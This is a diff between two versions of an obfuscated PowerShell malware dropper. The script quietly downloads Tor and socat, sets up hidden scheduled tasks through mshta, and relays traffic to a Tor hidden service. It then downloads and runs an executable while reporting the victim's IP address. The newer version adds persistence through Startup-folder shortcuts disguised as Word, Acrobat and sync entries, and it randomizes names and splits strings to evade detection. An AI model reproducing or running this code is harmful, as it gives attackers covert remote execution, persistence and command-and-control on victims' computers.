@@ -1,7 +1,7 @@
 $SH_TYPE_SCHEDULED_TASK=1;
 $SH_TYPE_TASK_SCHEDULER=2;
 $schedulerType=$SH_TYPE_SCHEDULED_TASK;
-function FeViquuLO
+function vJYtFTKLash
 {
 param([string]$zipfile, [string]$destination);
 $7z = Join-Path $env:ALLUSERSPROFILE '7za.exe';
@@ -24,6 +24,33 @@ $shell.Namespace($destination).copyhere($item);
 }
 }
 }
+
+function Add-Shortcut{
+    param([string]$target_path, [string]$dest_path, [string]$work_path, [string]$arguments="");
+    
+    $_path=Split-Path $dest_path;
+    if (-Not (Test-Path $_path)){
+        mkdir -Force $_path;
+    }
+    if (-Not (Test-Path $target_path)){
+        Write-Output "Can't add shortcut. Target path '$target_path' not found.";
+        return;
+    }
+    if ((Test-Path $dest_path)){
+        Write-Output "Can't add shortcut. Destination path '$dest_path' exist.";
+        return;
+    }
+
+    $_shell = New-Object -ComObject ("WScript.Shell");
+    $_shortcut = $_shell.CreateShortcut($dest_path);
+    $_shortcut.TargetPath=$target_path;
+    if(-Not [String]::IsNullOrEmpty($arguments)){
+        $_shortcut.Arguments=$arguments;
+    }
+    $_shortcut.WorkingDirectory=$work_path;
+    $_shortcut.Save();
+}
+
 function Base64ToFile
 {
 param([string]$file, [string]$string);
@@ -42,16 +69,16 @@ function InitScheduller{
     }catch{
         $File=$env:Temp+'\'+(RandomString)+'.zip';
         $Dest=$env:Temp+'\'+(RandomString);
-        while (!(WHPvIISILmoLx 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
+        while (!(BHjbULqP 'https://api.nuget.org/packages/taskscheduler.2.5.23.nupkg' $File)) {}
         if ((Test-Path $Dest) -eq 1){Remove-Item -Force -Recurse $Dest;}mkdir $Dest | Out-Null;
-        FeViquuLO $File $Dest;
+        vJYtFTKLash $File $Dest;
         Remove-Item -Force $File;
         $TSAssembly=$Dest+'\lib\net20\Microsoft.Win32.TaskScheduler.dll';
         $loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
         return $SH_TYPE_TASK_SCHEDULER;
     }
 }
-function veXZ
+function jLPnJWClmDVBa
 {
 param([string]$name, [string]$cmd, [string]$params='',[int]$restart=0,[int]$delay=0,[string]$dir='');
 switch ($schedulerType) {
@@ -112,69 +139,77 @@ switch ($schedulerType) {
     };
 }
 }
-function WHPvIISILmoLx {
-    param([string]$bGGncncitXphn, [string]$HUxJDzjGS);
+function BHjbULqP {
+    param([string]$RdjuM, [string]$CJJjosNxuWCDI);
     $ErrorActionPreference = "Stop";
-    Write-Host ("Download {0} to {1}" -f ($bGGncncitXphn, $HUxJDzjGS));
+    Write-Host ("Download {0} to {1}" -f ($RdjuM, $CJJjosNxuWCDI));
+    try{
+        [Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls, ssl3";
+    }catch{}
     try {
-        Start-BitsTransfer -Source $bGGncncitXphn -Destination $HUxJDzjGS;
+        Start-BitsTransfer -Source $RdjuM -Destination $CJJjosNxuWCDI;
     }
     catch {
         #Write-Error $_ -ErrorAction Continue;
         try {
-            (New-Object System.Net.WebClient).DownloadFile($bGGncncitXphn,$HUxJDzjGS);
+            (New-Object System.Net.WebClient).DownloadFile($RdjuM,$CJJjosNxuWCDI);
         }
         catch {
             #Write-Error $_ -ErrorAction Continue;
-            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$bGGncncitXphn`" `"$HUxJDzjGS`"" -Wait -WindowStyle Hidden;
+            Start-Process "cmd.exe" -ArgumentList "/b /c bitsadmin /transfer /download /priority HIGH `"$RdjuM`" `"$CJJjosNxuWCDI`"" -Wait -WindowStyle Hidden;
         }
     }finally{
         $ErrorActionPreference = "Continue";
     }
-    if ( $(Try { Test-Path $HUxJDzjGS.trim() } Catch { $false })){
+    if ( $(Try { Test-Path $CJJjosNxuWCDI.trim() } Catch { $false })){
         return $true;
     }
     return $false;
 }
-function ywuAYkxIMerW{
+function lWa{
 $schedulerType = InitScheduller;
 $tf=$env:Temp+'\'+(RandomString)+'.zip';
-$DestTP=$env:ALLUSERSPROFILE+'\'+(RandomString);
-$TorMirrors=@("https://dist.torproject.org/",
-"https://torproject.mirror.metalgamer.eu/dist/",
-"https://tor.ybti.net/dist/");
-foreach ($mirror in $TorMirrors) {
-    $_url=$mirror+'torbrowser/7.5.2/tor-win32-0.3.2.10.zip';
-    if((WHPvIISILmoLx $_url $tf)){
+$euUTiqa=$env:ALLUSERSPROFILE+'\'+(RandomString);
+$MqXDdNgkS=@([string]::Concat('https://di','st.t','orproject.org/'), [string]::Concat("https://mirror.oldsql.cc/t","or/di","st/"), [string]::Concat("https://to","rmirror.tb-itf-t","or.de/di","st/"));
+foreach ($VsFwiqVKEg in $MqXDdNgkS) {
+    $oepirVn=$VsFwiqVKEg+"torbrowser/8.0.3/t"+"or-win32-0.3.4.8.zip";
+    if((BHjbULqP $oepirVn $tf)){
         break;
     }
 }
-if ((Test-Path $DestTP) -eq 1){Remove-Item -Force -Recurse $DestTP;}mkdir $DestTP | Out-Null;
-FeViquuLO $tf $DestTP;
+if ((Test-Path $euUTiqa) -eq 1){Remove-Item -Force -Recurse $euUTiqa;}mkdir $euUTiqa | Out-Null;
+vJYtFTKLash $tf $euUTiqa;
 Remove-Item -Force $tf;
-$FEopykv=$DestTP+'\Tor\';
-$VanlMedufSmugw="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"tor.exe`",0,False))";
-veXZ (RandomString) 'mshta.exe' $VanlMedufSmugw 0 0 $FEopykv;
-$SFile=$env:Temp+'\'+(RandomString)+'.zip';
-$s_new=(RandomString);
-$iWC=$DestTP+'\'+$s_new+'\';
-WHPvIISILmoLx 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $SFile;
-if ( $(Try { Test-Path $SFile.trim() } Catch { $false })){
-    FeViquuLO $SFile $DestTP;
-    $s_old=$DestTP+'\socat-windows-1.7.2.1\';
-    Rename-Item -path $s_old -newName $s_new;
+$lfOrlkZH=$euUTiqa+"\T"+"or\";
+$eugtrj="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"t"+"or.exe`",0,False))";
+jLPnJWClmDVBa (RandomString) 'mshta.exe' $eugtrj 0 0 $lfOrlkZH;
+
+Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\msword.lnk" $vzfkFcawDbIUSya $toawwyJljC
+
+$Rso=$env:Temp+'\'+(RandomString)+'.zip';
+$WjYWCfwb=(RandomString);
+$ujYYmgNxNo=$euUTiqa+'\'+$WjYWCfwb+'\';
+BHjbULqP 'https://github.com/StudioEtrange/socat-windows/archive/1.7.2.1.zip' $Rso;
+if ( $(Try { Test-Path $Rso.trim() } Catch { $false })){
+    vJYtFTKLash $Rso $euUTiqa;
+    $ViLUNZPxnsnJae=$euUTiqa+'\socat-windows-1.7.2.1\';
+    Rename-Item -path $ViLUNZPxnsnJae -newName $WjYWCfwb;
 }else{
-    WHPvIISILmoLx 'http://blog.gentilkiwi.com/downloads/socat-1.7.2.1.zip' $SFile;
-    FeViquuLO $SFile $iWC;
+    BHjbULqP 'http://blog.gentilkiwi.com/downloads/socat-1.7.2.1.zip' $Rso;
+    vJYtFTKLash $Rso $ujYYmgNxNo;
 }
-Remove-Item -Force $SFile;
-$s1cmd='socat tcp4-LISTEN:5555,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
+Remove-Item -Force $Rso;
+$s1cmd='socat tcp4-LISTEN:38340,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:80,socksport=9050';
 $s2cmd='socat tcp4-LISTEN:5588,reuseaddr,fork,keepalive,bind=127.0.0.1 SOCKS4A:127.0.0.1:%DOMAIN%:5588,socksport=9050';
-$EiKLYNgwdMi="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
-$haPsBDM="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
-veXZ (RandomString) 'mshta.exe' $EiKLYNgwdMi 0 0 $iWC;
-veXZ (RandomString) 'mshta.exe' $haPsBDM 0 0 $iWC;
-$LrqoSErumL="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
-veXZ (RandomString) 'mshta.exe' $LrqoSErumL 1;
+$XohDZxb="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s1cmd`",0,False))";
+$sCIQx="vbscript:close(CreateObject(`"WScript.Shell`").Run(`"$s2cmd`",0,False))";
+jLPnJWClmDVBa (RandomString) 'mshta.exe' $XohDZxb 0 0 $ujYYmgNxNo;
+jLPnJWClmDVBa (RandomString) 'mshta.exe' $sCIQx 0 0 $ujYYmgNxNo;
+
+Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\acrobat.lnk" $ujYYmgNxNo $XohDZxb
+Add-Shortcut "$([System.Environment]::SystemDirectory)\mshta.exe" "$([System.Environment]::GetFolderPath('Startup'))\sync.lnk" $ujYYmgNxNo $sCIQx
+
+$gyzGBxzqFLBKp="vbsc"+"ript:close(CreateObject(`"WScript.Shell`").Run(`"powershell.exe `"`"`$F=`$env:Temp+'\\"+(RandomString)+".exe';rm -Force `$F;`$cl=(New-Object Net.WebClient);`$cl.DownloadFile('http://127.0.0.1:5555/"+(RandomString)+".asp?ts&ip='+`$cl.Download`"+`"String('http://api.ipify.org/'),`$F);& `$F`"`"`",0,False))";
+jLPnJWClmDVBa (RandomString) 'mshta.exe' $gyzGBxzqFLBKp 1;
 }
-ywuAYkxIMerW;
+lWa;
